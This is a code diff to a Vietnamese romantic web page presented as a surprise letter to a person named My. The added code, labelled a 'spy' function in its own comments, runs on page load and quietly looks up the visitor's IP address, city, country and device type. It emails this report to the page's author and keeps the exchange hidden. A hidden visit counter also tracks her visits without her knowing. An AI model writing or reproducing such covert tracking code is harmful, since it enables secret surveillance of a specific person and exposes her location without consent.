@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gửi My</title>
+    <title>Gửi My</title> <meta property="og:title" content="Có một lá thư gửi cho My nè... 💌" />
+    <meta property="og:description" content="Nhấn vào đây để xem điều bất ngờ nhé!" />
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/3209/3209907.png" />
+    
     <link href="https://fonts.googleapis.com/css2?family=Mali:wght@400;700&family=Pacifico&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     
     <style>
-        /* --- GIỮ NGUYÊN TOÀN BỘ CSS CŨ --- */
+        /* --- GIỮ NGUYÊN CSS --- */
         body { margin: 0; padding: 0; height: 100vh; width: 100vw; overflow: hidden; background: linear-gradient(180deg, #ffdde1 0%, #ee9ca7 100%); font-family: 'Mali', cursive; position: relative; }
-        
         .morning-glow { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(225deg, rgba(255, 245, 157, 0.4) 0%, rgba(255, 255, 255, 0) 50%); z-index: 3; pointer-events: none; }
         .cute-sun { position: absolute; top: -50px; right: -50px; width: 200px; height: 200px; z-index: 2; animation: sunFloat 6s ease-in-out infinite, sunRotate 20s linear infinite; filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6)); }
         @keyframes sunFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(10px); } }
         @keyframes sunRotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         .sky-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .cloud { position: absolute; opacity: 0.8; animation: moveCloud linear infinite; }
         .cloud img { width: 120px; }
@@ -67,44 +68,90 @@
 
     <div id="counterContainer" style="position: absolute; bottom: 10px; width: 100%; text-align: center; z-index: 999; pointer-events: none; display: none;">
         <span style="font-family: 'Mali', cursive; color: #ff6b81; font-size: 14px; margin-right: 5px;">Số lần ghé thăm: </span>
-        </div>
+    </div>
 
     <script>
-        // --- MÃ BỘ ĐẾM CỦA BẠN (LƯU VÀO BIẾN) ---
-        // Chúng ta lưu nó dưới dạng chuỗi chữ, chưa cho chạy ngay
-        const myCounterHTML = `<a href="https://www.hitwebcounter.com/" target="_blank" style="pointer-events: auto;">
-            <img src="https://hitwebcounter.com/counter/counter.php?page=21475210&style=0004&nbdigits=5&type=page&initCount=0" title="Free Tools" Alt="Free Tools" border="0" />
-        </a>`;
-
-        // --- XỬ LÝ LOGIC HIỂN THỊ (QUAN TRỌNG) ---
-        const urlParams = new URLSearchParams(window.location.search);
-        const counterDiv = document.getElementById('counterContainer');
-
-        if (urlParams.has('me')) {
-            // TRƯỜNG HỢP 1: CÓ DUÔI "?me=true"
-            // -> KHÔNG làm gì cả. Không chèn mã đếm vào.
-            // -> Kết quả: Không tải ảnh -> Không đếm.
-            console.log("Chế độ chủ nhân: Đã chặn bộ đếm!");
-        } 
-        else if (urlParams.has('admin')) {
-            // TRƯỜNG HỢP 2: CÓ DUÔI "?admin=true"
-            // -> Chèn mã đếm vào VÀ Hiện lên cho xem
-            counterDiv.innerHTML += myCounterHTML;
-            counterDiv.style.display = 'block'; 
-        } 
-        else {
-            // TRƯỜNG HỢP 3: NGƯỜI DÙNG BÌNH THƯỜNG (Cô ấy)
-            // -> Chèn mã đếm vào (để nó đếm +1) NHƯNG VẪN GIỮ ẨN (display: none)
-            counterDiv.innerHTML += myCounterHTML;
-        }
-
-        // --- GIỮ NGUYÊN JS CŨ BÊN DƯỚI ---
+        // --- 1. CẤU HÌNH EMAILJS ---
         const PUBLIC_KEY = "evaOeDQQxQ9LLBHbZ";
         const SERVICE_ID = "service_a18yiyn";
         const TEMPLATE_ID = "template_5vrf9nz";
 
         (function(){ emailjs.init(PUBLIC_KEY); })();
 
+        // --- 2. HÀM ĐIỆP VIÊN: GỬI BÁO CÁO TRUY CẬP ---
+        function trackAndNotify() {
+            // Kiểm tra xem đã gửi báo cáo phiên này chưa (để tránh spam F5)
+            if (sessionStorage.getItem('notified') === 'true') return;
+            
+            // Kiểm tra nếu là Chủ nhân (?me=true) hoặc Admin (?admin=true) thì KHÔNG GỬI báo cáo
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('me') || urlParams.has('admin')) return;
+
+            // Lấy thông tin API
+            fetch('https://ipwho.is/')
+                .then(response => response.json())
+                .then(data => {
+                    const device = getDeviceName(); // Lấy tên thiết bị
+                    const location = `${data.city}, ${data.country}`; // Lấy vị trí
+                    const ip = data.ip; // Lấy IP
+                    const time = new Date().toLocaleString('vi-VN');
+
+                    // Soạn nội dung báo cáo
+                    const reportMessage = `
+                        🚀 CÓ KHÁCH TRUY CẬP MỚI!
+                        --------------------------
+                        📱 Thiết bị: ${device}
+                        📍 Vị trí: ${location}
+                        🌐 IP: ${ip}
+                        ⏰ Thời gian: ${time}
+                    `;
+
+                    // Gửi Email âm thầm
+                    const templateParams = {
+                        message: reportMessage,
+                        date_time: time
+                    };
+
+                    emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
+                        .then(() => {
+                            console.log("Đã gửi báo cáo cho điệp viên!");
+                            sessionStorage.setItem('notified', 'true'); // Đánh dấu đã gửi
+                        });
+                })
+                .catch(err => console.log("Không lấy được vị trí", err));
+        }
+
+        // Hàm phát hiện thiết bị đơn giản
+        function getDeviceName() {
+            const ua = navigator.userAgent;
+            if (/Android/i.test(ua)) return "Điện thoại Android";
+            if (/iPhone/i.test(ua)) return "iPhone";
+            if (/iPad/i.test(ua)) return "iPad";
+            if (/Windows/i.test(ua)) return "Máy tính Windows";
+            if (/Mac/i.test(ua)) return "Máy tính Mac";
+            return "Thiết bị lạ";
+        }
+
+        // Kích hoạt Điệp viên ngay khi vào web
+        trackAndNotify();
+
+
+        // --- 3. LOGIC HIỂN THỊ BỘ ĐẾM & UI CŨ ---
+        const myCounterHTML = `<a href="https://www.hitwebcounter.com/" target="_blank" style="pointer-events: auto;"><img src="https://hitwebcounter.com/counter/counter.php?page=21475210&style=0004&nbdigits=5&type=page&initCount=0" title="Free Tools" Alt="Free Tools" border="0" /></a>`;
+        
+        const counterDiv = document.getElementById('counterContainer');
+        const urlParams = new URLSearchParams(window.location.search);
+
+        if (urlParams.has('me')) {
+            console.log("Chế độ chủ nhân: Đã chặn bộ đếm!");
+        } else if (urlParams.has('admin')) {
+            counterDiv.innerHTML += myCounterHTML;
+            counterDiv.style.display = 'block'; 
+        } else {
+            counterDiv.innerHTML += myCounterHTML;
+        }
+
+        // --- 4. JS CŨ (NHẠC, THƯ...) ---
         const questions = ["Hé lôô 👋","Ngày hôm nay của em thế nào? 🌤️", "Có điều gì làm em vui hay buồn không? 🤔", "Dù thế nào thì anh vẫn luôn ở đây lắng nghe em nè ❤️", "Hãy kể cho anh nhé! 💌"];
         const autoMessage = "Dù ngày hôm nay của em có vui hay buồn thì vẫn hãy luôn nở nụ cười nhé vì em xinh nhất khi cười đó ^^";
         
